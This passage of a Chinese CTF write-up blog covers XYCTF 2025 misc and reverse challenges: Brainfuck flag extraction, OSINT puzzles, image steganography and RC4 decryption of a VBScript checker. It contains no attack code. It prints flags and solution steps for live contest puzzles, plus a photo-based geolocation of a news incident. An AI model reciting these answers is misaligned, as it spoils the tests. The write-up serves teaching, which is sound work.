class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br></pre></td></tr></table></figure><br>可以知道这里在地址为0处写入数据之后会将它擦除，所以可以在擦除之前将地址为0的数据打印出来，修改代码如下：<br><figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line">&gt;<span class="literal">+++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br></pre></td></tr></table></figure></p>
<h3 id="XGCTF"><a href="#XGCTF" class="headerlink" title="XGCTF"></a>XGCTF</h3><blockquote>
<p>题目描述：<br>2024年CTFshow举办了一场名为“西瓜杯”的比赛（XGCTF）。其中LamentXU在出题的时候，从某场比赛拉了道原题下来改了改，结果传文件的时候传错了传成原题了。因为这件事LamentXU的损友dragonkeep在他之前的博客上的原题wp上加了一段flag来嘲笑LamentXU。请你找到XGCTF中唯一由LamentXU出的题，并找出这题对应的原题，接着找到dragonkeep师傅的博客，并从博客上讲解该题的博文中找到flag。（hint：dragonkeep师傅因为比较穷买不起域名，因此他博客的域名在dragonkeep的基础上多了个字母）</p>
</blockquote>
<p>从题目描述中可以整理出三条线索：</p>
<ol>
<li>flag在dragonkeep的博客里</li>
<li>这道题的flag所在的位置与XGCTF的一道原题有关</li>
<li>相关题目在XGCTF中标注的出题人为LamentXU</li>
</ol>
<p>首先可以找到dragonkeep的博客为：<a href="https://dragonkeeep.top，可以看到这个师傅主攻的方向应该是web，所以可以大致将范围缩小到XGCTF的web题，直接到[XGCTF的复现平台](https://ctf.show/challenges)中可以找到唯一一道由LamentXU提供的题目：">https://dragonkeeep.top，可以看到这个师傅主攻的方向应该是web，所以可以大致将范围缩小到XGCTF的web题，直接到[XGCTF的复现平台](https://ctf.show/challenges)中可以找到唯一一道由LamentXU提供的题目：</a><br><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202504102114116.png" alt="Pasted image 20250404173308"><br>关键词应该是polluted，回到dragonkeep的博客中可以发现一篇文章跟polluted有关：<a target="_blank" rel="noopener" href="https://dragonkeeep.top/category/CISCN%E5%8D%8E%E4%B8%9C%E5%8D%97WEB-Polluted/">CISCN华东南WEB-Polluted | Dragonkeep</a>，在里面找一圈没找到flag，看看是不是在网页HTML源代码的注释里面，查看网页源代码可以找到：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--Congratulations! You&#x27;ve got the flag:ZmxhZ3sxdF9JM190M0Vfc0BNZV9DaEFsMWVOZ2VfYVRfYTFMX1AxZUBzZV9mT3JnMXZlX01lfQ== --&gt;</span></span><br></pre></td></tr></table></figure>
<p>base64解码就是flag了.</p>
<h3 id="会飞的雷克萨斯"><a href="#会飞的雷克萨斯" class="headerlink" title="会飞的雷克萨斯"></a>会飞的雷克萨斯</h3><blockquote>
<p>在比赛群里给出flag的格式为flag{xx省xx市xx县xxx路xxxxxx内}，一个x对应一个字</p>
</blockquote>
<p>OSINT，给出一张图片：<br><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202504102112308.jpeg" alt="ab3f53c6b3d2cfd23674a0c6e277d895"></p>
<p>直接搜索题目名字可以发现这是今年新年小孩玩炮仗炸化粪池把车炸飞的其中一个当事人在事发后改的网名，大多数新闻都显示发生的位置是四川省内江市资中县春岚北路，但是没有给出具体小区名，这个时候需要结合图片，注意到有一间叫唯曼医疗美容的店，百度地图搜索可以看到唯一结果：<br><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202504102113751.png" alt="Pasted image 20250406232555"><br>可以知道事发地是在中铁城市中心内，所以flag就是flag{四川省内江市资中县春岚北路中铁城市中心内}</p>
<h3 id="曼波曼波曼波"><a href="#曼波曼波曼波" class="headerlink" title="曼波曼波曼波"></a>曼波曼波曼波</h3><p>给了个smn.txt，打开发现是倒过来的Base64，解码之后是张图片：<br><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202504102113269.jpg" alt="smn"><br>附件里面还有个二维码，但是是假的flag，不用管，010可以看到上面图片的末尾有段zip，拉出来之后解压发现有一张图片，一个压缩包还有一个txt，txt里面是对压缩包密码的提示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密码是什么来着，有点记不清了，呜呜呜呜</span><br><span class="line">好像是什么比赛名字加年份</span><br></pre></td></tr></table></figure>
<p>不用想都知道是XYCTF2025，解压发现一张跟外面的图片看上去一模一样的图片，且尺寸也是一致的，考虑盲水印，解盲水印可以看到：<br><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202504102113280.png" alt="out"><br>肉眼识别可以得到flag为XYCTF{easy_yin_xie_dfbfuj877}</p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="WARMUP"><a href="#WARMUP" class="headerlink" title="WARMUP"></a>WARMUP</h3><p>vbs逆向，用记事本打开并将开头的<code>Execute</code>改成<code>wscript.echo</code>，然后在命令行用<code>cscript</code>运行可以得到源码：<br><figure class="highlight vb"><table><tr><td class="code"><pre><span class="line">MsgBox <span class="string">&quot;Dear CTFER. Have fun in XYCTF 2025!&quot;</span></span><br><span class="line">flag = InputBox(<span class="string">&quot;Enter the FLAG:&quot;</span>, <span class="string">&quot;XYCTF&quot;</span>)</span><br><span class="line">wefbuwiue = <span class="string">&quot;90df4407ee093d309098d85a42be57a2979f1e51463a31e8d15e2fac4e84ea0df622a55c4ddfb535ef3e51e8b2528b826d5347e165912e99118333151273cc3fa8b2b3b413cf2bdb1e8c9c52865efc095a8dd89b3b3cfbb200bbadbf4a6cd4&quot;</span></span><br><span class="line">qwfe = <span class="string">&quot;rc4key&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> RunRC(sMessage, strKey)</span><br><span class="line">    <span class="keyword">Dim</span> kLen, i, j, temp, pos, outHex</span><br><span class="line">    <span class="keyword">Dim</span> s(<span class="number">255</span>), k(<span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">    kLen = Len(strKey)</span><br><span class="line">    <span class="keyword">For</span> i = <span class="number">0</span> <span class="keyword">To</span> <span class="number">255</span></span><br><span class="line">        s(i) = i</span><br><span class="line">        k(i) = Asc(<span class="keyword">Mid</span>(strKey, (i <span class="built_in">Mod</span> kLen) + <span class="number">1</span>, <span class="number">1</span>)) </span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line"></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">For</span> i = <span class="number">0</span> <span class="keyword">To</span> <span class="number">255</span></span><br><span class="line">        j = (j + s(i) + k(i)) <span class="built_in">Mod</span> <span class="number">256</span></span><br><span class="line">        temp = s(i)</span><br><span class="line">        s(i) = s(j)</span><br><span class="line">        s(j) = temp</span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span> : j = <span class="number">0</span> : outHex = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">For</span> pos = <span class="number">1</span> <span class="keyword">To</span> Len(sMessage)</span><br><span class="line">        i = (i + <span class="number">1</span>) <span class="built_in">Mod</span> <span class="number">256</span></span><br><span class="line">        j = (j + s(i)) <span class="built_in">Mod</span> <span class="number">256</span></span><br><span class="line">        temp = s(i)</span><br><span class="line">        s(i) = s(j)</span><br><span class="line">        s(j) = temp</span><br><span class="line"></span><br><span class="line">        <span class="keyword">Dim</span> plainChar, cipherByte</span><br><span class="line">        plainChar = Asc(<span class="keyword">Mid</span>(sMessage, pos, <span class="number">1</span>)) </span><br><span class="line">        cipherByte = s((s(i) + s(j)) <span class="built_in">Mod</span> <span class="number">256</span>) <span class="built_in">Xor</span> plainChar</span><br><span class="line">        outHex = outHex &amp; Right(<span class="string">&quot;0&quot;</span> &amp; Hex(cipherByte), <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line"></span><br><span class="line">    RunRC = outHex</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> LCase(RunRC(flag, qwfe)) = LCase(wefbuwiue) <span class="keyword">Then</span></span><br><span class="line">    MsgBox <span class="string">&quot;Congratulations! Correct FLAG!&quot;</span></span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">    MsgBox <span class="string">&quot;Wrong flag.&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br></pre></td></tr></table></figure><br>就是RC4加密，密钥为<code>rc4key</code>，用CyberChef解密就可以得到flag了.</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://triodelzx.github.io">Triode</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://triodelzx.github.io/2025/04/10/XYCTF-2025-%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWrite-Up/">https://triodelzx.github.io/2025/04/10/XYCTF-2025-%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWrite-Up/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Crypto/">Crypto</a><a class="post-meta__tags" href="/tags/Misc/">Misc</a><a class="post-meta__tags" href="/tags/Reverse/">Reverse</a></div><div class="post_share"><div class="social-share" data-image="/img/512.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/04/29/Pwn%E7%AC%94%E8%AE%B0-1-ret2%E7%B3%BB%E5%88%97/" title="Pwn笔记(1) ret2系列"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">Pwn笔记(1) ret2系列</div></div></a></div><div class="next-post pull-right"><a href="/2025/04/09/NTRU/" title="NTRU"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">NTRU</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2023/12/15/Anshel%E2%80%93Anshel%E2%80%93Goldfeld-%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2%E4%BD%93%E7%B3%BB-Anshel%E2%80%93Anshel%E2%80%93Goldfeld-key-exchange/" title="Anshel–Anshel–Goldfeld 密钥交换体系(Anshel–Anshel–Goldfeld key exchange)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-15</div><div class="title">Anshel–Anshel–Goldfeld 密钥交换体系(Anshel–Anshel–Goldfeld key exchange)</div></div></a></div><div><a href="/2024/03/29/PicoCTF2024-Crypto%E9%83%A8%E5%88%86WP/" title="PicoCTF2024 Crypto部分WP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-29</div><div class="title">PicoCTF2024 Crypto部分WP</div></div></a></div><div><a href="/2023/12/17/LCG%E7%AC%94%E8%AE%B0/" title="LCG笔记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-17</div><div class="title">LCG笔记</div></div></a></div><div><a href="/2024/07/12/%E8%8B%A5%E5%B0%94%E5%BD%93%E6%A0%87%E5%87%86%E5%9E%8B%E4%B8%8E%E7%9F%A9%E9%98%B5%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0%E9%97%AE%E9%A2%98/" title="若尔当标准型与矩阵离散对数问题"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-12</div><div class="title">若尔当标准型与矩阵离散对数问题</div></div></a></div><div><a href="/2024/03/09/%E8%BF%9E%E5%88%86%E6%95%B0%EF%BC%88Continued-Fractions%EF%BC%89%E7%AC%94%E8%AE%B0/" title="连分数（Continued Fractions）笔记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-09</div><div class="title">连分数（Continued Fractions）笔记</div></div></a></div><div><a href="/2024/11/27/%E5%B7%B2%E7%9F%A5%E4%B8%A4%E8%B4%A8%E5%9B%A0%E6%95%B0%E5%8D%8A%E6%95%B0%E4%BB%A5%E4%B8%8A%E9%9A%8F%E6%9C%BA%E4%BD%8D%E7%9A%84%E5%A4%A7%E6%95%B4%E6%95%B0%E5%88%86%E8%A7%A3/" title="已知两质因数半数以上随机位的大整数分解"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-27</div><div class="title">已知两质因数半数以上随机位的大整数分解</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/512.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Triode</div><div class="author-info__description">Beginner of Cryptography</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/TriodeLzx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/TriodeLzx" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:Lzx0916l@163.com" target="_blank" title="邮箱"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Division"><span class="toc-text">Division</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Complex-signin"><span class="toc-text">Complex_signin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E5%A4%8D%E5%A4%8D%E5%A4%8D%E6%95%B0"><span class="toc-text">复复复复数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#reed"><span class="toc-text">reed</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-text">勒索病毒（复现）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#choice%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-text">choice（复现）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#prng-xxxx%EF%BC%88%E5%BE%85%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-text">prng_xxxx（待复现）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E4%B8%AA%E5%88%B0%E5%90%A7"><span class="toc-text">签个到吧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XGCTF"><span class="toc-text">XGCTF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%9A%E9%A3%9E%E7%9A%84%E9%9B%B7%E5%85%8B%E8%90%A8%E6%96%AF"><span class="toc-text">会飞的雷克萨斯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 